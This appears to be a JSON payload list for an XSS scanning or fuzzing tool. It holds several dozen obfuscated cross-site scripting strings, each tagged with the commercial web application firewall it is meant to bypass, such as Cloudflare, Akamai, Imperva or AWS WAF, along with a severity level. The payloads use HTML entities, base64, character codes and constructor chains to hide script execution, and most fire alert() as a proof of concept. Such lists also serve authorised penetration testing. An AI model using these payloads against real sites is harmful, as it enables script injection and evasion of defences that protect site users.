[
    {
        "Payload": "<img/src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "Attribute": ["<", ">", "/", "=", "(", ")", ".", ","],
        "count": 0,
        "waf": "cloudflare",
        "description": "Cloudflare bypass using fromCharCode",
        "level": "high"
    },
    {
        "Payload": "<svg/onload=\"&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "&", "#", "x", ";"],
        "count": 0,
        "waf": "cloudflare",
        "description": "Cloudflare bypass with HTML entities",
        "level": "high"
    },
    {
        "Payload": "<iframe/srcdoc=\"&lt;script&gt;parent.alert(1)&lt;/script&gt;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "&", ";"],
        "count": 0,
        "waf": "cloudflare",
        "description": "Cloudflare bypass using iframe srcdoc with entities",
        "level": "critical"
    },
    {
        "Payload": "<details/ontoggle=\"eval(atob('YWxlcnQoMSk='))\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", "'"],
        "count": 0,
        "waf": "cloudflare",
        "description": "Cloudflare bypass with base64 encoded payload",
        "level": "high"
    },
    {
        "Payload": "<input/onfocus=\"new Function('alert(1)')()\" autofocus>",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", "'"],
        "count": 0,
        "waf": "akamai",
        "description": "Akamai bypass using Function constructor",
        "level": "high"
    },
    {
        "Payload": "<svg><animatetransform/onbegin=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "&", "#", ";"],
        "count": 0,
        "waf": "akamai",
        "description": "Akamai bypass with SVG animation and decimal entities",
        "level": "high"
    },
    {
        "Payload": "<marquee/onstart=\"top[String.fromCharCode(97,108,101,114,116)](1)\">",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "(", ")", ".", ","],
        "count": 0,
        "waf": "akamai",
        "description": "Akamai bypass with top window reference and char codes",
        "level": "high"
    },
    {
        "Payload": "<object/data=\"data:text/html,<script>alert(1)</script>\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", ",", "(", ")"],
        "count": 0,
        "waf": "akamai",
        "description": "Akamai bypass using object data URI",
        "level": "critical"
    },
    {
        "Payload": "<iframe/onload=\"frames[0].alert(1)\" src=\"javascript:void(0)\">",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "(", ")", ":", ";"],
        "count": 0,
        "waf": "imperva",
        "description": "Imperva bypass using frames reference",
        "level": "high"
    },
    {
        "Payload": "<style>@import\"javascript:alert(1)\";</style>",
        "Attribute": ["<", ">", "@", "\"", ":", "(", ")", ";"],
        "count": 0,
        "waf": "imperva",
        "description": "Imperva bypass with CSS @import JavaScript",
        "level": "medium"
    },
    {
        "Payload": "<link/rel=\"stylesheet\" href=\"javascript:alert(1)\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", "(", ")"],
        "count": 0,
        "waf": "imperva",
        "description": "Imperva bypass using link stylesheet JavaScript",
        "level": "medium"
    },
    {
        "Payload": "<form><input/name=\"javascript:alert(1)\" type=\"image\"></form>",
        "Attribute": ["<", ">", "/", "=", "\"", ":", "(", ")"],
        "count": 0,
        "waf": "imperva",
        "description": "Imperva bypass with form input name",
        "level": "low"
    },
    {
        "Payload": "<video/poster=\"javascript:alert(1)\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", "(", ")"],
        "count": 0,
        "waf": "f5",
        "description": "F5 ASM bypass using video poster",
        "level": "medium"
    },
    {
        "Payload": "<canvas/oncontextmenu=\"alert(String.fromCharCode(88,83,83))\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", ","],
        "count": 0,
        "waf": "f5",
        "description": "F5 bypass with canvas context menu and char codes",
        "level": "high"
    },
    {
        "Payload": "<audio/controls/oncanplay=\"self['alert'](1)\">",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "'", "(", ")"],
        "count": 0,
        "waf": "f5",
        "description": "F5 bypass with audio event and self reference",
        "level": "high"
    },
    {
        "Payload": "<embed/src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", ";", "+"],
        "count": 0,
        "waf": "f5",
        "description": "F5 bypass with embed base64 HTML data",
        "level": "critical"
    },
    {
        "Payload": "<table/onmouseover=\"this.constructor.constructor('alert(1)')()\" background=\"x\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", "'"],
        "count": 0,
        "waf": "barracuda",
        "description": "Barracuda bypass with table constructor chain",
        "level": "high"
    },
    {
        "Payload": "<select/onfocus=\"new(Function.bind.call(Function,null,'alert(1)'))()\" autofocus>",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", ",", "'"],
        "count": 0,
        "waf": "barracuda",
        "description": "Barracuda bypass with Function.bind technique",
        "level": "critical"
    },
    {
        "Payload": "<keygen/onfocus=\"top['ev'+'al']('al'+'ert(1)')\" autofocus>",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "'", "+", "(", ")"],
        "count": 0,
        "waf": "barracuda",
        "description": "Barracuda bypass with keygen and string concatenation",
        "level": "high"
    },
    {
        "Payload": "<meter/onmouseover=\"window[atob('YWxlcnQ=')]('XSS')\" value=1 max=1>",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "(", ")", "'"],
        "count": 0,
        "waf": "barracuda",
        "description": "Barracuda bypass with meter and base64 function name",
        "level": "high"
    },
    {
        "Payload": "<base/href=\"javascript:;\" onclick=\"alert(1)\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", ";", "(", ")"],
        "count": 0,
        "waf": "sucuri",
        "description": "Sucuri bypass with base href and onclick",
        "level": "medium"
    },
    {
        "Payload": "<optgroup/label=\"javascript:alert(1)\" onmousedown=\"eval(this.label)\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", "(", ")", "."],
        "count": 0,
        "waf": "sucuri",
        "description": "Sucuri bypass with optgroup label evaluation",
        "level": "high"
    },
    {
        "Payload": "<fieldset/onactivate=\"Function('alert(1)')()\" disabled>",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", "'"],
        "count": 0,
        "waf": "sucuri",
        "description": "Sucuri bypass with fieldset activate event",
        "level": "medium"
    },
    {
        "Payload": "<legend/ondatasetchanged=\"top.Function('alert(1)')()\" dataset-x=\"y\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", "'", "-"],
        "count": 0,
        "waf": "sucuri",
        "description": "Sucuri bypass with legend dataset event",
        "level": "medium"
    },
    {
        "Payload": "<img/src=x onerror=\"alert(/XSS/.source)\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", "."],
        "count": 0,
        "waf": "modsecurity",
        "description": "ModSecurity bypass using regex source property",
        "level": "high"
    },
    {
        "Payload": "<svg/onload=\"location='\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:\\u0061\\u006c\\u0065\\u0072\\u0074(1)'\">",
        "Attribute": ["<", ">", "/", "=", "\"", "'", "\\", ":", "(", ")"],
        "count": 0,
        "waf": "modsecurity",
        "description": "ModSecurity bypass with Unicode escaped JavaScript URL",
        "level": "critical"
    },
    {
        "Payload": "<iframe/srcdoc=\"&lt;img src=x:x onerror=parent.alert(1)&gt;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "&", ";", ":", "(", ")"],
        "count": 0,
        "waf": "modsecurity",
        "description": "ModSecurity bypass with iframe srcdoc parent reference",
        "level": "critical"
    },
    {
        "Payload": "<object/type=\"text/html\" data=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\">",
        "Attribute": ["<", ">", "/", "=", "\"", ":", ",", "&", ";"],
        "count": 0,
        "waf": "modsecurity",
        "description": "ModSecurity bypass with object HTML data and entities",
        "level": "critical"
    },
    {
        "Payload": "<details/open/ontoggle=\"(alert)(1)\" hidden>",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")"],
        "count": 0,
        "waf": "wordfence",
        "description": "Wordfence bypass with parenthesized function call",
        "level": "high"
    },
    {
        "Payload": "<summary/onclick=\"top[`a${''}lert`](1)\">Click</summary>",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "`", "$", "{", "}", "'", "(", ")"],
        "count": 0,
        "waf": "wordfence",
        "description": "Wordfence bypass with template literal interpolation",
        "level": "high"
    },
    {
        "Payload": "<time/onmouseover=\"[]['fill']['constructor']('alert(1)')()\" datetime=\"\">",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "'", "(", ")"],
        "count": 0,
        "waf": "wordfence",
        "description": "Wordfence bypass with array method constructor access",
        "level": "critical"
    },
    {
        "Payload": "<progress/onanimationstart=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\" style=\"animation:spin 1s;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", ",", ":", ";"],
        "count": 0,
        "waf": "wordfence",
        "description": "Wordfence bypass with CSS animation trigger and char codes",
        "level": "critical"
    },
    {
        "Payload": "<input/type=\"image\" formaction=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
        "Attribute": ["<", ">", "/", "=", "\"", "&", "#", "x", ";"],
        "count": 0,
        "waf": "aws-waf",
        "description": "AWS WAF bypass with form action hex entities",
        "level": "high"
    },
    {
        "Payload": "<map/name=\"x\"><area/shape=\"circle\" coords=\"0,0,1\" href=\"javascript:alert('XSS')\"></map>",
        "Attribute": ["<", ">", "/", "=", "\"", ",", ":", "(", ")", "'"],
        "count": 0,
        "waf": "aws-waf",
        "description": "AWS WAF bypass with image map area JavaScript URL",
        "level": "high"
    },
    {
        "Payload": "<audio/autoplay/onloadstart=\"new(top.Function)('alert(1)')()\" controls>",
        "Attribute": ["<", ">", "/", "=", "\"", "(", ")", ".", "'"],
        "count": 0,
        "waf": "aws-waf",
        "description": "AWS WAF bypass with audio autoplay and top.Function",
        "level": "high"
    },
    {
        "Payload": "<track/kind=\"subtitles\" onerror=\"globalThis[atob('YWxlcnQ=')]('XSS')\" src=\"//\">",
        "Attribute": ["<", ">", "/", "=", "\"", "[", "]", "(", ")", "'"],
        "count": 0,
        "waf": "aws-waf",
        "description": "AWS WAF bypass with track error and globalThis base64",
        "level": "critical"
    }
]
